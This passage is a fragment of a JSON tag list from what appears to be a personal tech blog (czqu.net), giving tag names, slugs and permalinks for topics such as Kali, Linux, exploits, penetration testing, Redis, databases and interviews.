gs/kali/"},{"name":"linux","slug":"linux","permalink":"https://czqu.net/tags/linux/"},{"name":"exploit","slug":"exploit","permalink":"https://czqu.net/tags/exploit/"},{"name":"渗透","slug":"渗透","permalink":"https://czqu.net/tags/%E6%B8%97%E9%80%8F/"},{"name":"kernel","slug":"kernel","permalink":"https://czqu.net/tags/kernel/"},{"name":"c","slug":"c","permalink":"https://czqu.net/tags/c/"},{"name":"虚拟机","slug":"虚拟机","permalink":"https://czqu.net/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"操作系统","slug":"操作系统","permalink":"https://czqu.net/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"生活","slug":"生活","permalink":"https://czqu.net/tags/%E7%94%9F%E6%B4%BB/"},{"name":"redis","slug":"redis","permalink":"https://czqu.net/tags/redis/"},{"name":"面试","slug":"面试","permalink":"https://czqu.net/tags/%E9%9D%A2%E8%AF%95/"},{"name":"数据库","slug":"数据库","permalink":"https://czqu.net/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://czqu.net/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]}